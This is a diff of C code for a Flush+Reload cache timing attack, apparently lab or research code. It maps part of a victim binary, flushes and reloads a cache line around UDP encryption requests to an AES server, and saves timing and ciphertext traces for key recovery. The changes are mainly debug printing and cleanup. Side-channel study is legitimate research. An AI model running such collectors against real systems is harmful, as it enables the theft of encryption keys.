@@ -30,17 +30,13 @@ int fd = -1;
 char *victimBinaryFileName;
 
 FILE *timingFP, *cipherFP, *plainFP;
-int offset;
+size_t offset;
 
 uint8_t *plaintext, *ciphertext;
 uint32_t *timing;
-uint32_t time_;
 void *target;
 struct sockaddr_in server;
 int s;
-int r;
-struct sockaddr_in client;
-socklen_t len;
 
 void init();
 void finish();
@@ -110,9 +106,9 @@ int main(int argc, char** argv)
     init();
     printf("Collecting data\n");
     for (i = 0; i < numTraces; i++){
-#ifdef DEBUG
+//#ifdef DEBUG
         printf("Sample: %i\n", i);
-#endif
+//#endif
         doTrace();
     }
     finish();
@@ -125,9 +121,9 @@ void generatePlaintext()
     for(j = 0; j < 16; j++){
         plaintext[j] = random() & 0xff;
     }
-#ifdef DEBUG
+//#ifdef DEBUG
     printText(plaintext, 16, "plaintext");
-#endif
+//#endif
 }
 void savePlaintext()
 {
@@ -185,21 +181,27 @@ uint32_t reload(void *target)
 void doTrace()
 {
     // generate a new plaintext
+    printf("Generating Plaintext\n");
     generatePlaintext();
     // set the cache to a known state by flushing an address
+    printf("Flushing Target\n");
     clflush(target);
-    // send the plaintext to victim (server)for an encryption and receive the ciphertex
-    len = sizeof(client);
-    sendto(s, plaintext,16, 0, (struct sockaddr *) &server, len);
-    r = recvfrom(s, ciphertext, 16,0, (struct sockaddr *) &server, &len);   
+    // send the plaintext to victim (server)for an encryption and receive the ciphertext
+    printf("Connecting to victim\n");
+    socklen_t serverlen;
+    serverlen = sizeof server;
+    sendto(s, plaintext, 16, 0, (struct sockaddr*)&server, serverlen);
+    recvfrom(s, ciphertext, 16, 0, (struct sockaddr*)&server, &serverlen);
     // check current cache state (reload the same address)
-    // record timing and ciphertext
+    printf("Reloading Cache \n");
     *timing = reload(target);
+    // record timing and ciphertext
+    printf("Saving Trace\n");
     saveTrace();
-#ifdef DEBUG
+//#ifdef DEBUG
     printText(ciphertext, 16, "ciphertext");
     printf("Timing: %i\n", *timing);
-#endif
+//#endif
 }
 void printText(uint8_t *text, int count, char *header)
 {
@@ -217,10 +219,8 @@ void *map_offset(const char *file, size_t offset) {
 
   char *mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
   close(fd);
-  if (mapaddress == MAP_FAILED){
+  if (mapaddress == MAP_FAILED)
     return NULL;
-  
-  }
   return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
 }
 
@@ -244,13 +244,12 @@ void init()
 
     // setup the target for monitoring
     printf("setting up target\n");
-    target =map_offset(victimBinaryFileName, offset);
-    
+    target = map_offset(victimBinaryFileName, offset);
 
 // #ifdef DEBUG
     printf("offset: %x\n", offset);
     printf("target: %p\n", target);
-    //printText(target, 16, "Target");
+    printText(target, 16, "Target");
     // printText(target + 256 * 4, 16, "T1");
 // #endif
 
@@ -274,7 +273,7 @@ void finish()
 
     fclose(timingFP);
     fclose(cipherFP);
-    if(plainFP != NULL)
+    if( plainFP != NULL )
         fclose(plainFP);
 
     unmap_offset(addr);
